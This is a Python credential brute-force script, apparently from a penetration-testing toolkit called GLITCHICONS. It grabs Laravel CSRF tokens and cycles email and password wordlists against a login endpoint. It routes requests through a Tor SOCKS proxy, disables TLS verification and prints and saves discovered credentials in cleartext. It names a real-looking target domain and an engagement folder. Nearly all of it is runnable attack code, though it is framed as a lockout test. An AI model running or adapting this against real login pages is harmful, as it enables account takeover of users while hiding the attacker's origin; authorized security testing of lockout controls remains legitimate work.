"""
GLITCHICONS ⬡ — Brute Force Module
Target: [CLIENT]
Generic CSRF-aware login brute force module
"""

import requests
import time
import re
import sys
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

PROXIES = {
    "http": "socks5://127.0.0.1:9050",
    "https": "socks5://127.0.0.1:9050"
}

def get_csrf_token(session, url):
    """Grab XSRF token dari cookie setelah GET request."""
    try:
        r = session.get(url, verify=False, timeout=15)
        # Laravel XSRF token ada di cookie
        xsrf = session.cookies.get("XSRF-TOKEN")
        if xsrf:
            from urllib.parse import unquote
            return unquote(xsrf)
        # Fallback: cari di HTML meta tag
        match = re.search(r'name=["\']_token["\'] value=["\']([^"\']+)', r.text)
        if match:
            return match.group(1)
        return None
    except Exception as e:
        console.print(f"[red]CSRF grab error: {e}[/red]")
        return None

def check_lockout(response):
    """Deteksi apakah akun/IP di-lockout."""
    lockout_indicators = [
        "too many", "locked", "blocked", "throttle",
        "rate limit", "429", "suspended", "captcha"
    ]
    text = response.text.lower()
    for indicator in lockout_indicators:
        if indicator in text:
            return True
    return response.status_code == 429

def try_login(session, login_url, email, password, csrf_token):
    """Attempt single login."""
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "X-XSRF-TOKEN": csrf_token,
        "Referer": "https://v2.ancientwisdom.biz/app/login",
        "Origin": "https://target.example.com",
    }
    payload = {
        "email": email,
        "password": password,
    }
    try:
        r = session.post(
            login_url,
            json=payload,
            headers=headers,
            verify=False,
            timeout=15,
            allow_redirects=False
        )
        return r
    except Exception as e:
        return None

def brute_force(
    target="https://target.example.com",
    email_file=None,
    password_file=None,
    single_email=None,
    delay=2.0,
    max_attempts=50,
    output_dir=None
):
    """Main brute force function."""

    login_url = f"{target}/login"
    login_page = f"{target}/app/login"

    console.print(Panel(
        f"[bold purple]⬡ GLITCHICONS BRUTE FORCE[/bold purple]\n"
        f"[dim]Target : {login_url}[/dim]\n"
        f"[dim]Delay  : {delay}s | Max: {max_attempts} attempts[/dim]",
        border_style="purple"
    ))

    # Load wordlists
    emails = []
    if single_email:
        emails = [single_email]
    elif email_file:
        emails = Path(email_file).read_text().strip().splitlines()

    passwords = []
    if password_file:
        passwords = Path(password_file).read_text().strip().splitlines()

    console.print(f"  Emails   : [bold]{len(emails)}[/bold]")
    console.print(f"  Passwords: [bold]{len(passwords)}[/bold]")
    console.print(f"  Total    : [bold]{len(emails) * len(passwords)}[/bold] combinations\n")

    findings = []
    attempt = 0
    lockout_detected = False

    for email in emails:
        session = requests.Session()

        # Grab fresh CSRF token per email
        console.print(f"[dim]→ Testing: {email}[/dim]")
        csrf = get_csrf_token(session, login_page)
        if not csrf:
            console.print(f"[yellow]  ⚠ No CSRF token found — trying without[/yellow]")
            csrf = ""

        for password in passwords:
            if attempt >= max_attempts:
                console.print(f"[yellow]Max attempts ({max_attempts}) reached — stopping[/yellow]")
                break

            attempt += 1
            r = try_login(session, login_url, email, password, csrf)

            if r is None:
                console.print(f"[red]  ✗ Connection error[/red]")
                time.sleep(delay * 2)
                continue

            # Check lockout
            if check_lockout(r):
                lockout_detected = True
                console.print(f"\n[bold green]⬡ LOCKOUT DETECTED after {attempt} attempts![/bold green]")
                console.print(f"[green]  → Account protection is ACTIVE[/green]")
                console.print(f"  Status: {r.status_code}")
                findings.append({
                    "type": "LOCKOUT_DETECTED",
                    "email": email,
                    "attempts": attempt,
                    "status": r.status_code
                })
                break

            # Check success
            if r.status_code in [200, 302] and "dashboard" in r.text.lower():
                console.print(f"\n[bold red]⬡ LOGIN SUCCESS: {email}:{password}[/bold red]")
                findings.append({
                    "type": "CREDENTIAL_FOUND",
                    "email": email,
                    "password": password,
                    "status": r.status_code
                })

            # Check no lockout (vulnerability)
            elif r.status_code in [200, 422]:
                if attempt % 10 == 0:
                    console.print(
                        f"  [dim]Attempt {attempt}: {email} / {password[:4]}*** "
                        f"→ {r.status_code} (no lockout)[/dim]"
                    )

            time.sleep(delay)

        if lockout_detected:
            break

    # Summary
    console.print(f"\n[bold]⬡ BRUTE FORCE COMPLETE[/bold]")
    console.print(f"  Total attempts : {attempt}")
    console.print(f"  Lockout detected: {'YES ✅' if lockout_detected else 'NO ⚠️  — VULNERABILITY!'}")

    if not lockout_detected and attempt >= 10:
        console.print(f"\n[bold red]⚠  NO LOCKOUT AFTER {attempt} ATTEMPTS — HIGH SEVERITY FINDING[/bold red]")
        findings.append({
            "type": "NO_LOCKOUT_PROTECTION",
            "attempts": attempt,
            "severity": "HIGH"
        })

    # Save report
    if output_dir:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = out / f"bruteforce_{ts}.md"
        lines = [
            f"# Brute Force Report — {ts}",
            f"Target: {login_url}",
            f"Attempts: {attempt}",
            f"Lockout: {'YES' if lockout_detected else 'NO'}",
            "",
        ]
        for f in findings:
            lines.append(f"## {f['type']}")
            for k, v in f.items():
                lines.append(f"- {k}: {v}")
            lines.append("")
        report.write_text("\n".join(lines))
        console.print(f"\n[dim]Report: {report}[/dim]")

    return findings


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")

    brute_force(
        target="https://target.example.com",
        email_file="wordlists/wholesale_emails.txt",
        password_file="wordlists/business_passwords.txt",
        delay=2.0,
        max_attempts=100,
        output_dir="engagements/ancient-wisdom/findings/bruteforce"
    )
